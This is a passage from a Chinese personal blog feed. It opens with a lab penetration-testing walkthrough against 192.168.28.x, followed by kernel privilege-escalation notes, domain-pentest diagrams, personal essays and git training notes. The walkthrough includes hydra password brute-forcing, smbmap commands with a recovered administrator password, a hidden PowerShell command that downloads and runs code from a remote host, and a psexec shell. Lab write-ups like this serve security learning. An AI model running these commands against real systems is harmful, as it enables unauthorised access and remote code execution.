<br>|<span class="hljs-type">_</span>  ERROR: Failed to connect to browser service: No accounts <span class="hljs-built_in">left</span> to <span class="hljs-built_in">try</span><br>| <span class="hljs-type">smb</span>-protocols: <br>|   <span class="hljs-type">dialects</span>: <br>|     <span class="hljs-type">NT</span> LM <span class="hljs-number">0.12</span> (SMBv1) [dangerous, but default]<br>|     <span class="hljs-type">2</span><span class="hljs-number">.02</span><br>|     <span class="hljs-type">2</span><span class="hljs-number">.10</span><br>|     <span class="hljs-type">3</span><span class="hljs-number">.00</span><br>|<span class="hljs-type">_</span>    <span class="hljs-number">3.02</span><br>| <span class="hljs-type">smb</span>-security-mode: <br>|   <span class="hljs-type">account_used</span>: &lt;blank&gt;<br>|   <span class="hljs-type">authentication_level</span>: user<br>|   <span class="hljs-type">challenge_response</span>: supported<br>|<span class="hljs-type">_</span>  message_signing: disabled (dangerous, but default)<br>| <span class="hljs-type">smb2</span>-capabilities: <br>|   <span class="hljs-type">2</span><span class="hljs-number">.02</span>: <br>|     <span class="hljs-type">Distributed</span> <span class="hljs-keyword">File</span> System<br>|   <span class="hljs-type">2</span><span class="hljs-number">.10</span>: <br>|     <span class="hljs-type">Distributed</span> <span class="hljs-keyword">File</span> System<br>|     <span class="hljs-type">Leasing</span><br>|     <span class="hljs-type">Multi</span>-credit operations<br>|   <span class="hljs-type">3</span><span class="hljs-number">.00</span>: <br>|     <span class="hljs-type">Distributed</span> <span class="hljs-keyword">File</span> System<br>|     <span class="hljs-type">Leasing</span><br>|     <span class="hljs-type">Multi</span>-credit operations<br>|   <span class="hljs-type">3</span><span class="hljs-number">.02</span>: <br>|     <span class="hljs-type">Distributed</span> <span class="hljs-keyword">File</span> System<br>|     <span class="hljs-type">Leasing</span><br>|<span class="hljs-type">_</span>    Multi-credit operations<br>| <span class="hljs-type">smb2</span>-security-mode: <br>|   <span class="hljs-type">2</span><span class="hljs-number">.02</span>: <br>|<span class="hljs-type">_</span>    Message signing enabled but not required<br>| <span class="hljs-type">smb2</span>-<span class="hljs-built_in">time</span>: <br>|   <span class="hljs-type">date</span>: <span class="hljs-number">2020</span><span class="hljs-number">-07</span><span class="hljs-number">-23</span> <span class="hljs-number">22</span>:<span class="hljs-number">16</span>:<span class="hljs-number">51</span><br>|<span class="hljs-type">_</span>  start_date: <span class="hljs-number">2020</span><span class="hljs-number">-07</span><span class="hljs-number">-21</span> <span class="hljs-number">22</span>:<span class="hljs-number">56</span>:<span class="hljs-number">07</span><br>| <span class="hljs-type">unusual</span>-port: <br>|<span class="hljs-type">_</span>  WARNING: this script depends on Nmap&#x27;s service/version detection (-sV)<br><br>Post-scan script results:<br>| <span class="hljs-type">reverse</span>-index: <br>|<span class="hljs-type">_</span>  <span class="hljs-number">445</span>/tcp: <span class="hljs-number">192.168</span><span class="hljs-number">.28</span><span class="hljs-number">.20</span><br><br>smbclient -L //<span class="hljs-number">192.168</span><span class="hljs-number">.28</span><span class="hljs-number">.20</span><br>WARNING: The <span class="hljs-string">&quot;syslog&quot;</span> option is deprecated<br>Enter WORKGROUP\root&#x27;s password: <br></code></pre></div></td></tr></table></figure><p>需要输入密码才能访问</p><h4 id="全端口扫描"><a href="#全端口扫描" class="headerlink" title="全端口扫描"></a>全端口扫描</h4><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-number">135</span>/tcp   <span class="hljs-keyword">open</span>  msrpc<br><span class="hljs-number">139</span>/tcp   <span class="hljs-keyword">open</span>  netbios-ssn<br><span class="hljs-number">445</span>/tcp   <span class="hljs-keyword">open</span>  microsoft-ds<br><span class="hljs-number">5985</span>/tcp  <span class="hljs-keyword">open</span>  wsman<br><span class="hljs-number">47001</span>/tcp <span class="hljs-keyword">open</span>  winrm<br><span class="hljs-number">49152</span>/tcp <span class="hljs-keyword">open</span>  <span class="hljs-type">unknown</span><br><span class="hljs-number">49153</span>/tcp <span class="hljs-keyword">open</span>  <span class="hljs-type">unknown</span><br><span class="hljs-number">49154</span>/tcp <span class="hljs-keyword">open</span>  <span class="hljs-type">unknown</span><br><span class="hljs-number">49155</span>/tcp <span class="hljs-keyword">open</span>  <span class="hljs-type">unknown</span><br><span class="hljs-number">49156</span>/tcp <span class="hljs-keyword">open</span>  <span class="hljs-type">unknown</span><br><span class="hljs-number">49174</span>/tcp <span class="hljs-keyword">open</span>  <span class="hljs-type">unknown</span><br><span class="hljs-number">49178</span>/tcp <span class="hljs-keyword">open</span>  <span class="hljs-type">unknown</span><br><span class="hljs-number">49185</span>/tcp <span class="hljs-keyword">open</span>  <span class="hljs-type">unknown</span><br></code></pre></div></td></tr></table></figure><h4 id="5985"><a href="#5985" class="headerlink" title="5985"></a>5985</h4><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -p <span class="hljs-number">5985</span> -sV <span class="hljs-number">192.168.28.20</span><br><span class="hljs-attribute">5985</span>/tcp open  http    Microsoft HTTPAPI httpd <span class="hljs-number">2</span>.<span class="hljs-number">0</span> (SSDP/UPnP)<br><span class="hljs-attribute">47001</span>/tcp open  http    Microsoft HTTPAPI httpd <span class="hljs-number">2</span>.<span class="hljs-number">0</span> (SSDP/UPnP)<br><br><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.28.20:5985</span><br><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.28.20:47001</span>/<br></code></pre></div></td></tr></table></figure><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="失败的操作"><a href="#失败的操作" class="headerlink" title="失败的操作"></a>失败的操作</h3><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino">Windows <span class="hljs-built_in">Server</span> <span class="hljs-number">2008</span> R2 - <span class="hljs-number">2012</span><br>而且开放了<span class="hljs-number">445</span>，这个exp先打一下试试看<br>use exploit/windows/smb/ms08_067_netapi<br>失败<br></code></pre></div></td></tr></table></figure><h2 id="53port"><a href="#53port" class="headerlink" title="53port"></a>53port</h2><p>nmap -p53 192.168.28.10 -sV</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">Starting</span> Nmap <span class="hljs-number">7</span>.<span class="hljs-number">70</span> ( https://nmap.org ) at <span class="hljs-number">2020</span>-<span class="hljs-number">07</span>-<span class="hljs-number">23</span> <span class="hljs-number">22</span>:<span class="hljs-number">43</span> +<span class="hljs-number">08</span><br><span class="hljs-attribute">Nmap</span> scan report for <span class="hljs-number">192.168.28.10</span><br><span class="hljs-attribute">Host</span> is up (<span class="hljs-number">0</span>.<span class="hljs-number">00036</span>s latency).<br><span class="hljs-attribute">PORT</span>   STATE SERVICE VERSION<br><span class="hljs-attribute">53</span>/tcp open  domain?<br></code></pre></div></td></tr></table></figure><p>nmap –script=discovery  192.168.28.10</p><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">域名 <span class="hljs-keyword">test</span>.<span class="hljs-keyword">local</span><br><br>smbclient -<span class="hljs-keyword">L</span> 192.168.28.10<br>WARNING: The <span class="hljs-string">&quot;syslog&quot;</span> option is deprecated<br>Enter WORKGROUP\root&#x27;s password: <br>Anonymous login successful<br>Domain=[<span class="hljs-keyword">TEST</span>] OS=[Windows Server 2012 R2 Standard 9600] Server=[Windows Server 2012 R2 Standard 6.3]<br><br>Sharename       <span class="hljs-keyword">Type</span>      Comment<br>---------       ----      -------<br><span class="hljs-keyword">Error</span> returning <span class="hljs-keyword">browse</span> <span class="hljs-keyword">list</span>: NT_STATUS_ACCESS_DENIED<br>Connection to 192.168.28.10 failed (<span class="hljs-keyword">Error</span> NT_STATUS_RESOURCE_NAME_NOT_FOUND)<br>NetBIOS over TCP disabled -- <span class="hljs-keyword">no</span> workgroup available<br><br>echo 192.168.28.10 <span class="hljs-keyword">test</span>.<span class="hljs-keyword">local</span> &gt;&gt; /etc/hosts<br><br>nmap -p 389 -script ldap-<span class="hljs-keyword">search</span> <span class="hljs-keyword">test</span>.<span class="hljs-keyword">local</span><br>389/tcp <span class="hljs-keyword">open</span>  ldap<br><br>ldapsearch -<span class="hljs-keyword">h</span> 192.168.28.10 -p 389 -x -b dc=<span class="hljs-keyword">test</span>,dc=<span class="hljs-keyword">local</span> <br></code></pre></div></td></tr></table></figure><h2 id="成功的操作"><a href="#成功的操作" class="headerlink" title="成功的操作"></a>成功的操作</h2><figure class="highlight lasso"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs lasso">hydra <span class="hljs-number">192.168</span><span class="hljs-number">.28</span><span class="hljs-number">.20</span> smb <span class="hljs-params">-l</span> Administrator <span class="hljs-params">-P</span> /usr/share/wordlists/<span class="hljs-number">500</span><span class="hljs-params">-worst</span><span class="hljs-params">-passwords.txt</span> <span class="hljs-params">-T</span> <span class="hljs-number">64</span> <span class="hljs-params">-V</span><br>enum4linux <span class="hljs-params">-a</span> <span class="hljs-params">-o</span> test.<span class="hljs-built_in">local</span> &gt; test.<span class="hljs-built_in">local</span>.txt<br>---<br><br>Target <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.. test.<span class="hljs-built_in">local</span><br>RID Range <span class="hljs-params">...</span><span class="hljs-params">...</span>.. <span class="hljs-number">500</span><span class="hljs-number">-550</span>,<span class="hljs-number">1000</span><span class="hljs-number">-1050</span><br>Username <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span> <span class="hljs-string">&#x27;&#x27;</span><br>Password <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span> <span class="hljs-string">&#x27;&#x27;</span><br>Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, <span class="hljs-literal">none</span><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/08-05-10/1.PNG" alt="1"></p><p>smbmap -u administrator -p abc123! -d workgroup -H 192.168.28.20</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/08-05-10/2.PNG" alt="2"></p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">smbmap -u administrator -<span class="hljs-selector-tag">p</span> abc123! -d workgroup  -H <span class="hljs-number">192.168</span>.<span class="hljs-number">28.20</span> -P <span class="hljs-number">445</span> -R admin$ &gt; smb-admin<span class="hljs-selector-class">.txt</span><br><br>smbmap -u administrator -<span class="hljs-selector-tag">p</span> abc123! -d workgroup  -H <span class="hljs-number">192.168</span>.<span class="hljs-number">28.20</span> -P <span class="hljs-number">445</span> -R c$ &gt; smb-c<span class="hljs-selector-class">.txt</span><br><br>smbmap -u administrator -<span class="hljs-selector-tag">p</span> abc123! -d workgroup  -H <span class="hljs-number">192.168</span>.<span class="hljs-number">28.20</span> -P <span class="hljs-number">445</span> -R c/users$ &gt; smb-c<span class="hljs-selector-class">.txt</span><br><br>smbmap -u administrator -<span class="hljs-selector-tag">p</span> abc123! -d workgroup  -H <span class="hljs-number">192.168</span>.<span class="hljs-number">28.20</span> -P <span class="hljs-number">445</span> -R c$/users  &gt; c-user<span class="hljs-selector-class">.txt</span><br><br>smbmap -u administrator -<span class="hljs-selector-tag">p</span> abc123! -d workgroup  -H <span class="hljs-number">192.168</span>.<span class="hljs-number">28.20</span> -P <span class="hljs-number">445</span> -x <span class="hljs-string">&#x27;powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(\&#x27;http://192.168.28.1:80/a\&#x27;))\&quot;&#x27;</span> &gt; command-smb<span class="hljs-selector-class">.txt</span><br><br>powershell<span class="hljs-selector-class">.exe</span> -nop -w hidden -c <span class="hljs-string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.28.1:80/a&#x27;))&quot;</span><br></code></pre></div></td></tr></table></figure><h2 id="拿到一个shell"><a href="#拿到一个shell" class="headerlink" title="拿到一个shell"></a>拿到一个shell</h2><p>python /usr/share/doc/python-impacket/examples/psexec.py workgroup/Administrator@192.168.28.20 cmd.exe</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/08-05-10/3.PNG" alt="3"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://hackfun.org/2016/10/23/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8Benum4linux/">Kali Linux信息收集之enum4linux</a></p><p><a href="https://www.freebuf.com/sectool/131275.html">说说Powersploit在内网渗透中的使用</a></p>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux内核漏洞提权</title>
    <link href="/2020/07/19/01-x/"/>
    <url>/2020/07/19/01-x/</url>
    
    <content type="html"><![CDATA[<h1 id="linux内核漏洞提权"><a href="#linux内核漏洞提权" class="headerlink" title="linux内核漏洞提权"></a>linux内核漏洞提权</h1><p><strong>只要是稍微懈怠一下，上帝会以最快的速度带走你的天赋和能力，一秒钟都不会耽搁。</strong></p><p><a href="https://www.bilibili.com/video/BV1Rh411o7M9">https://www.bilibili.com/video/BV1Rh411o7M9</a></p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>linux操作系统</p><p>不会的，可以看《鸟哥的linux私房菜》</p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p>用脚本找内核漏洞</p><p>查找exp<br>(修改exp)<br>上传exp<br>执行exp</p><p>searchsploit </p><h2 id="工具链接"><a href="#工具链接" class="headerlink" title="工具链接"></a>工具链接</h2><p><a href="https://github.com/mungurk/linux-exploit-suggester.sh/blob/master/linux-exploit-suggester.sh">linux-exploit-suggester.sh</a></p><p><a href="https://raw.githubusercontent.com/Whale3070/ctf-coding/master/LinEnum.sh">LinEnum.sh</a></p><p>msf suggester</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://github.com/sagishahar-zz/lpeworkshop">https://github.com/sagishahar-zz/lpeworkshop</a></p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域渗透导图</title>
    <link href="/2020/07/05/09-x/"/>
    <url>/2020/07/05/09-x/</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/07-05-09/%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86.png" alt="域信息搜集"><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/07-05-09/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E8%B7%B5.png" alt="域渗透实践"><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/07-05-09/%E7%A5%A8%E6%8D%AE%E4%BC%AA%E9%80%A0.png" alt="票据伪造"></p>]]></content>
    
    
    <categories>
      
      <category>WindowsDomain</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WindowsDomain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>毕业之际</title>
    <link href="/2020/06/20/05-x/"/>
    <url>/2020/06/20/05-x/</url>
    
    <content type="html"><![CDATA[<p>从18岁上大学，到今天已经过了近5年。其中我的很多想法都改变了，也有很多还是老样子。就像蝴蝶效应一样，很多年前做的事情，都深深影响着今天我在哪里、做着什么事、成为了什么样的人。我还是很喜欢读书，思考一些一般人觉得无稽之谈，没必要思考的问题。作为一个死宅，还是没能学会与人打交道游刃有余的手段。</p><p>今天，在一个看不见星星的晚上，我又开始回忆我的前半生。</p><p>20岁之前，我一直想成为一个作家。写写小说，出本书。当然，我也那样去做了。但是我写的小说现在看来，确实很幼稚…… 最重要的是，我意识到了，我没办法为了实现这个梦想，放弃物质生活。在看不见希望的情况下，一直坚持去完成它。JK罗琳是一个靠领政府救济金度日的单身妈妈，在写完那本火遍全球的小说（哈利 · 波特）之前，还被出版社退稿过。</p><p>作为一个艺术系的学生，理想主义者不止我一个。其实现在我还在怀疑我其实是一个现实主义者。摇摆在现实主义与理想主义之间。我就这样放弃了艺术行业，准备从头开始，在另一个陌生的领域杀出一条生路。</p><p>前些日子的形教课，老师放出了一个PPT，上面展示了今年艺术系就业的情况。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/06-20-05/1.jpg"></p><p>除去考研、出国的，应该就业的人当中276人中有230人没有就业意向，这里的就业意向是包括创业、自由职业、公务员等等的一切就业形势。</p><p>写到这里我突然羡慕起我的长辈那一代人起来。听亲戚是，他们读小学的时候不要钱，读大学不要钱，毕业包分配，送房子，安安稳稳到今天，就拥有了现在年轻人求之不得的东西。房子车子职位金钱，创业机会，那时候真的容易成功。也许是幸存者偏差吧。突然想起来东北下岗潮也是那时候发生的事情。</p><p>疫情打乱了一切。想要在今年夏天考oscp也泡汤了。现在无法办理护照，去年要是知道这个情况就早早办好护照，买好N95口罩了。谁又能有早知道呢？</p><p>在接下来几年，我们（年轻一代人）可能会过的很艰难。可能会因为结构性失业，找不到工作。我也不知道艰难的时候是否会过去，但是希望会吧。活着总要有点希望不是吗？</p><p>哦，话题扯远了。谈谈老龄化的问题吧，老龄化的问题比我想象的可能会更加严重。</p><p>之前我以为大量的老人会拖垮社保，直接导致无产阶级90后拿不到养老金。但是，我现在发现这个城乡二元结构，只有城市里的老年人才能拿到养老金，存在大量的农村老年人一个月只有几十块钱的养老金。</p><ol><li><p>搞明白哪些人能够拿到自己交的一部分养老金，哪些人就是白交。</p></li><li><p>殡葬业是事业单位，关系户才能收到老龄化社会（老龄人口死亡率上升）的油水。所以不关注殡葬业了。<br>关注一下移民行业，也许有发展机会。</p></li></ol><p>这个社会，不是努力就会有回报的。出生阶级高、性别好、地理位置好等等，都比努力要重要。凡事看淡。虽然努力不一定有回报，但是不努力是不可能有回报的。</p><hr><p>刚上大学的时候，跟室友闹了不少矛盾，主要是性格不合，也说不算对错。水和火相遇，谁都没错。</p><p>幼稚的我看了网上的文章，然后大肆批判中国的宿舍，给外国留学生的住宿条件比本土学生好太多。</p><p>直到我第一次租房，是在北京，一个月不包水电费合租1800，让社会重新教我做人。学校住宿一年1200元。</p><p>首先，留学生在哪个国家来说，家庭条件都比本国学生平均条件要好不少。平均来说，能出国的比不能出国的学生就是更有钱。所以留学生比本国学生住宿条件更好，也是可以理解的。</p><p>其次，每个大学生上学，国家已经补贴了不少钱。而要提高学生住宿水平，就势必要加大补贴力度，要么涨学费。对不少贫困学生来说，涨学费是不可接受的。而加大教育补贴也不过是羊毛出在羊身上。</p><p>如果天朝是发达国家，那没话说，可惜不是。贫穷限制了这些。</p><p>我一直都喜欢说一句话“大学校园就是一座象牙塔”</p><p>还有2天就是毕业典礼——6月22号，我期盼了好几年的毕业终于来了。在公司工作了两三周，一切都挺顺利的，要警惕的是，不要沉迷在舒适区中安然度日。学习和健身都不能放松。</p><p><strong>我们总是希望把烦恼都解决了然后好好生活，但我们不知道，其实解决这些烦恼的过程，就是生活本身</strong></p><p>也许十年一眨眼很快就会过去，但是我要学会好好生活。以前我不明白活着有什么意义，其实活着就是给生命赋予意义。一块石头、一棵树、一抹彩虹，它存在的意义就是它存在的本身。活着就是一天三餐饭，不需要自寻烦恼。</p><hr><p>4年前我给自己订的目标是成为会拉小提琴的黑客，这个目标实现了一半吧，虽然全都是半吊子。在接下来的十年，我会好好珍惜这个能够进入自己喜欢的行业的机会，在行业内深耕，成为一个值得其他人尊敬的人。</p>]]></content>
    
    
    <categories>
      
      <category>View</category>
      
    </categories>
    
    
    <tags>
      
      <tag>View</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>谈近日翼装飞行女大学生死亡</title>
    <link href="/2020/06/13/06-x/"/>
    <url>/2020/06/13/06-x/</url>
    
    <content type="html"><![CDATA[<p>最近有一个24岁的女大学生死了，听说是翼装飞行意外事故去世的。</p><p>我第一想法是，每年意外事故去世的那么多，为什么她的死亡会上热搜？</p><p>这就要深入介绍一下翼装飞行了。翼装飞行是一种刺激的极限运动，很烧钱，比学艺术烧钱多了。</p><p>首先要有上百次的高空跳伞经验，才能开始翼装飞行。装备十万起步，数百次跳伞经验，就算花了一百万吧，这是按少了说的。就说刘某（死者）请的教练，是世界顶级水平，就不知道要花多少钱。</p><p>这种娱乐，对于她的家庭，应该算不上什么大钱。按照她花了百分之一的钱来玩这些，那么她的家庭至少是千万富翁（当然这是按照保守情况计算的）。再联想一下19年、20年的出生率。我国的贫富差距已经快达到了极限。穷人连一胎都生不起的情况下，富人出生就是富人，世世代代都是富人。这就是资本回报率大于劳动回报率所带来的结果。趋势已经很明显了。</p><p>农村出凤凰男的几率越来越小，<a href="https://www.zhihu.com/question/61517331">北京市文科状元熊轩昂</a>说他多亏了家庭和学校的教育，<strong>现在的状元都是这种家里又好又厉害的。</strong>，说穷人越来越不可能争的过有钱人了。</p><p>也许这是一种社会达尔文主义。穷人正在逐渐被社会淘汰。就像古代佃农因为有钱人三妻四妾，而找不到老婆结不起婚一样。<br>现代996的所谓白领，不过是地主手下成千上万的佃农。</p><p>地主以为996是福报，也就算了。可不要身为佃农认为996也是福报。</p><h2 id="怎么办"><a href="#怎么办" class="headerlink" title="怎么办"></a>怎么办</h2><p>冷嘲热讽说了也没用，那我们应该怎么办呢？韩国人再努力，阶级固化摆在那里，内卷化摆在那里，不出国而在本国努力，<br>努力的结果都被有钱人收割走了。为什么这么说，假如你努力存钱，存了十年的钱，房价一下子涨了几十万。<br>那你选择买房，钱不就白存了。劳动被谁收割了？</p><p>这就是现实。中国平均福利太差，房价、教育、养老、医疗，压在普通人身上的三座大山，一辈子都被这个套牢了。<br>一旦你选择结婚生子，那你一辈子的命运已经注定了。你不在为自己而活，你活着就是劳动力，为你的父母、子女、妻子而活。</p><p>为什么某些中年男性员工一旦失业，就跳楼呢？不在局中，永远不知道压力有多大。人的悲欢并不相通。</p><p>不要轻率评价他人的痛苦。</p><h2 id="如果贫富差距一直这么大，会带来什么结果"><a href="#如果贫富差距一直这么大，会带来什么结果" class="headerlink" title="如果贫富差距一直这么大，会带来什么结果"></a>如果贫富差距一直这么大，会带来什么结果</h2><p>我们首先看一下美国，这次疫情美国什么表现，我们有目共睹。<br>美国是一个割裂的社会，富人更容易成为精英、穷人无知而且产业链还迁移到其他国家，导致穷人失去工作。</p><p>有很多美国人甚至不知道地球是圆的。公立学校放羊、私立学校要有钱人才读得起。美国用福利把穷人圈起来，用移民撑起了世界霸主的地位。</p><p>如果中国的贫富差距这么大。中国不是发达国家，无法用福利引导穷人生育下一代，如果又无法阻止富人在国内赚够钱，带走他们的财产。那么中国的结局似乎已经注定了。毕竟，一个连新生儿人口数都无法撑起来的国家，又怎么能再延续5000年呢？</p><p>古代没有避孕措施、没有移民、无法出国留学、工作、也没有老龄化。而现代社会，也无法模拟古代社会来延续下一代。<br>让我们看看2020年的生育结果吧以及人口普查结果吧。关于这方面我在知乎上高赞的回答，以及我收藏的相关回答都被删了。</p><p>比如一个老板，生了二胎、三胎，他雇佣了100名员工，其中百分之20生了二胎，百分之30生了一胎，百分之50不结婚，或者丁克，或者无法生育。那么总和生育率就是73/101 = 0.722</p><p>基本上符合资本主义国家不到1.0的生育率。网上搜索一下，始终坚持不到1.0的生育率的国家未来终于会灭亡的。只不过过去是通过战争，今天是通过主动选择了灭亡。</p><p><strong>说实话，如果你出生在一个富裕的家庭，你的爸爸是马云、是李刚，那么这些问题都与你无缘。毕竟无产阶级斗争了几千年，断头王后安托瓦内特也就那么一个，文革中被打倒的臭老九也已经是过去式了，这种历史在你短短的几十年中几乎不会再重演了。</strong></p><p>韩国网络上近日流行起“勺子阶级论”，这种阶级论把20~39岁年轻人的父母年收入等家庭背景比喻为各种不同的“勺子”，按照家庭背景可分为“金勺”、“银勺”、“铜勺”和“土勺”四个不同阶级。</p><p>从具体标准来看，“金勺”指家庭财产高于20亿韩元(约合人民币1143万元)或年收入高于2亿韩元；“银勺”指家庭财产高于10亿韩元或年收入高于1亿韩元；“铜勺”指家庭财产高于5亿韩元或年收入5500万韩元；家庭财产低于5000万韩元或年收入低于2000万韩元的则被称为“土勺”。</p><p>韩国20~39岁年轻人面临着就业难、结婚难、低收入等种种问题，这样的境遇让他们相信，无论个人多么努力积累财富，永远不会“富得过”那些继承父母大量遗产的“金汤勺”们。</p>]]></content>
    
    
    <categories>
      
      <category>View</category>
      
    </categories>
    
    
    <tags>
      
      <tag>View</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>公司培训内容笔记</title>
    <link href="/2020/06/08/07-x/"/>
    <url>/2020/06/08/07-x/</url>
    
    <content type="html"><![CDATA[<h1 id="git"><a href="#git" class="headerlink" title="git"></a>git</h1><figure class="highlight smali"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs smali">git代码版本管理工具<br>ci工具链的使用<br><br>版本工具出现钱<br>1. 成员沟通效率低<br><br>有哪些代码管理工具<br>1. git 分布式（可以在客户端修改。每一台存在的数据，都是服务器，数据是一模一样的）<br>2. svn 集中式（只能在服务器上修改）<br><br>git有分支管理功能<br><br>git 工作区、版本库（.git）和暂存区(index)<br>开始工作前，进入工作区目录<br><br>图解git操作<br>push\clone\pull<span class="hljs-built_in"></span><br><span class="hljs-built_in">add </span>编辑添加代码文件<br>commit 编辑完成后，提交到本地<span class="hljs-built_in"></span><br><span class="hljs-built_in">check </span>out 这个命令什么意思，还需要查一下<br>git branch 列出本地分支<br>`git branch 分支名称`<br>新建分支<br>git checkout 分支名称<br>切换分支<br><br>git<span class="hljs-built_in"> add </span>文件名<br>添加文件到暂存区<br>git<span class="hljs-built_in"> add </span>.<br>    代表所有文件添加到暂存区<br>git checkout -- 文件名 <br>撤销<br>git reset <br><br>git log<br>    查看日志<br>git push origin 本地分支：远程分支<br>远程分支可以改变<br><br>git checkout master<br>切换到主分支<br><br>git checkout 个人fenzhi; git merge master<br>将主线分支合并到个人分支<br><br>git stash (储藏修改，临时保存，不提交）<br>git stash list<br><br>代码冲突<br>多个人改了同一份文件的同一行，就会产生代码冲突。<br>在分支合并的时候，会产生代码冲突错误<br><br>代码冲突的解决办法<br><br>git checkout -b 